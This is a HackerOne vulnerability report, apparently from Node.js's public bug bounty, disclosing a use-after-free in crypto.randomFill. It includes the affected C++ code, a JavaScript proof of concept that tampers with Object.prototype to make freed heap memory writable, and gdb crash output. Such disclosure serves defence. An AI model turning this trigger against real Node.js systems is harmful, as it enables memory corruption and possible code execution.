{"id":340053,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDAwNTM=","url":"https://hackerone.com/reports/340053","title":"Use After Free in crypto.randomFill","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2018-04-18T12:38:05.607Z","submitted_at":"2018-04-18T12:38:05.607Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tunz","url":"/tunz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-15T02:00:32.927Z","bug_reporter_agreed_on_going_public_at":"2020-01-15T02:00:32.891Z","team_member_agreed_on_going_public_at":"2020-01-14T23:48:27.884Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\nWe can trigger Use-After-Free while running crypto.randomFill, so we can easily read/write heap memory using a typed array pointing a freed backing store.\n\n**Description:**\n\nSee this `node_crypto.cc` code.\n```pp\nvoid RandomBytesBuffer(const FunctionCallbackInfo\u003cValue\u003e\u0026 args) {\n...\n  char* data = Buffer::Data(args[0]); // \u003c------------ Get a backing store from a given argument.\n  data += offset;\n\n  std::unique_ptr\u003cRandomBytesRequest\u003e req(\n      new RandomBytesRequest(env,\n                             obj,\n                             size,\n                             data,     // \u003c--------------------- Store the data to req\n                             RandomBytesRequest::DONT_FREE_DATA));\n...\n  } else {\n    Local\u003cValue\u003e argv[2];\n    RandomBytesProcessSync(env, std::move(req), \u0026argv); // \u003c---- This calls RandomBytesCheck\n...\n```\n\n```pp\nvoid RandomBytesCheck(RandomBytesRequest* req, Local\u003cValue\u003e (*argv)[2]) {\n...\n    char* data = nullptr;\n    size_t size;\n    req-\u003ereturn_memory(\u0026data, \u0026size);\n    (*argv)[0] = Null(req-\u003eenv()-\u003eisolate());\n    Local\u003cValue\u003e buffer =\n        req-\u003eobject()-\u003eGet(req-\u003eenv()-\u003econtext(),\n                           req-\u003eenv()-\u003ebuffer_string()).ToLocalChecked(); // \u003c----- We can return a non-buffer object here by modifying Object.prototype getter.\n\n    if (buffer-\u003eIsArrayBufferView()) {\n      ...\n    } else {\n      (*argv)[1] = Buffer::New(req-\u003eenv(), data, size) // \u003c------- This creates a Buffer with the backing store of a given argument Buffer.\n          .ToLocalChecked();\n...\n```\n\nAs a result, two buffers are sharing a backing store, so this triggers use-after-free if one of the buffers are freed by gc.\n\n## Steps To Reproduce:\n\nExecute the following code.\n\n```js\nconst crypto = require('crypto');\n\nObject.defineProperty(Object.prototype, \"buffer\", {\n  get: function() {\n    return {}; // Return a non-buffer.\n  }, set: function(v) {\n  }\n});\n\nlet size = 100000;\nlet ta = new Uint8Array(size);\ncrypto.randomFillSync(ta, 0, size);\n\n// Actually we don't need this part, this makes a buffer free and crashes just for PoC\nlet arr_size = 10000;\nlet arrs = new Array(arr_size);\nfor (let i = 0; i \u003carr_size; i++) {\n  let tmp = new Array(0x500);\n  arrs[i] = tmp;\n}\n\n// Just overwrites heap memory space to 0x41\nfor (let i = 0; i \u003c size; i++) {\n  ta[i] = 0x41;\n}\n```\n\n```\n$ ./out/Release/node --version\nv9.11.1\n$ gdb -q --args ./out/Release/node randombytes.js\nReading symbols from ./out/Release/node...r\ndone.\n(gdb) r\nStarting program: /.../ randombytes.js\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7fcd52464700 (LWP 34515)]\n[New Thread 0x7fcd51c63700 (LWP 34516)]\n[New Thread 0x7fcd51462700 (LWP 34520)]\n[New Thread 0x7fcd50c61700 (LWP 34522)]\n[New Thread 0x7fcd5391d700 (LWP 34529)]\n\nThread 1 \"node\" received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=av@entry=0x7fcd52829b20 \u003cmain_arena\u003e, bytes=bytes@entry=8192) at malloc.c:3567\n3567    malloc.c: No such file or directory.\n(gdb) x/i $pc\n=\u003e 0x7fcd524e6f04 \u003c_int_malloc+900\u003e:    mov    rdx,QWORD PTR [rax+0x8]\n(gdb) i r rax\nrax            0x4141414141414141       4702111234474983745\n(gdb)\n```\n\nI've tested this in node v9.11.1 built with clang in Ubuntu 16.04.3, and also reproducible in the master branch at the time of writing this report.\n\n## Impact\n\nThis vulnerability could lead to Remote Code Execution.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can trigger Use-After-Free while running crypto.randomFill, so we can easily read/write heap memory using a typed array pointing a freed backing store.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eSee this \u003ccode\u003enode_crypto.cc\u003c/code\u003e code.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight puppet\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eRandomBytesBuffer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econst\u003c/span\u003e \u003cspan class=\"nc\"\u003eFunctionCallbackInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eValue\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBuffer\u003c/span\u003e\u003cspan class=\"nf\"\u003e::Data\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e \u003cspan class=\"o\"\u003e//\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"o\"\u003e-----------\u003c/span\u003e \u003cspan class=\"nc\"\u003eGet\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003ebacking\u003c/span\u003e \u003cspan class=\"n\"\u003estore\u003c/span\u003e \u003cspan class=\"n\"\u003efrom\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003egiven\u003c/span\u003e \u003cspan class=\"n\"\u003eargument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n  \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003estd::unique_ptr\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eRandomBytesRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nf\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"n\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eRandomBytesRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                             \u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                             \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                             \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e     \u003cspan class=\"sr\"\u003e//\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"o\"\u003e--------------------\u003c/span\u003e \u003cspan class=\"nc\"\u003eStore\u003c/span\u003e \u003cspan class=\"n\"\u003ethe\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"n\"\u003eto\u003c/span\u003e \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\n                             \u003cspan class=\"nc\"\u003eRandomBytesRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e::\u003c/span\u003e\u003cspan class=\"nc\"\u003eDONT_FREE_DATA\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eLocal\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eValue\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"nf\"\u003eRandomBytesProcessSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estd::move\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"o\"\u003e//\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"o\"\u003e---\u003c/span\u003e \u003cspan class=\"nc\"\u003eThis\u003c/span\u003e \u003cspan class=\"n\"\u003ecalls\u003c/span\u003e \u003cspan class=\"nc\"\u003eRandomBytesCheck\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight puppet\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eRandomBytesCheck\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eRandomBytesRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLocal\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eValue\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enullptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003ereturn_memory\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eNull\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e()-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eisolate\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eLocal\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eValue\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e()-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eGet\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e()-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003econtext\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\n                           \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e()-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003ebuffer_string\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eToLocalChecked\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e \u003cspan class=\"o\"\u003e//\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"o\"\u003e----\u003c/span\u003e \u003cspan class=\"nc\"\u003eWe\u003c/span\u003e \u003cspan class=\"n\"\u003ecan\u003c/span\u003e \u003cspan class=\"n\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003enon\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e \u003cspan class=\"n\"\u003eobject\u003c/span\u003e \u003cspan class=\"n\"\u003ehere\u003c/span\u003e \u003cspan class=\"n\"\u003eby\u003c/span\u003e \u003cspan class=\"n\"\u003emodifying\u003c/span\u003e \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eprototype\u003c/span\u003e \u003cspan class=\"n\"\u003egetter\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n\n    \u003cspan class=\"nf\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eIsArrayBufferView\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBuffer\u003c/span\u003e\u003cspan class=\"nf\"\u003e::New\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"nf\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e//\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"o\"\u003e------\u003c/span\u003e \u003cspan class=\"nc\"\u003eThis\u003c/span\u003e \u003cspan class=\"n\"\u003ecreates\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"nc\"\u003eBuffer\u003c/span\u003e \u003cspan class=\"n\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003ethe\u003c/span\u003e \u003cspan class=\"n\"\u003ebacking\u003c/span\u003e \u003cspan class=\"n\"\u003estore\u003c/span\u003e \u003cspan class=\"n\"\u003eof\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003egiven\u003c/span\u003e \u003cspan class=\"n\"\u003eargument\u003c/span\u003e \u003cspan class=\"nc\"\u003eBuffer\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n          \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eToLocalChecked\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs a result, two buffers are sharing a backing store, so this triggers use-after-free if one of the buffers are freed by gc.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eExecute the following code.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ecrypto\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecrypto\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edefineProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Return a non-buffer.\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"na\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003esize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e100000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eta\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eUint8Array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ecrypto\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erandomFillSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eta\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Actually we don\u0026#39;t need this part, this makes a buffer free and crashes just for PoC\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003earr_size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e10000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003earrs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003earr_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003earr_size\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003etmp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x500\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003earrs\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Just overwrites heap memory space to 0x41\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eta\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x41\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./out/Release/node --version\nv9.11.1\n$ gdb -q --args ./out/Release/node randombytes.js\nReading symbols from ./out/Release/node...r\ndone.\n(gdb) r\nStarting program: 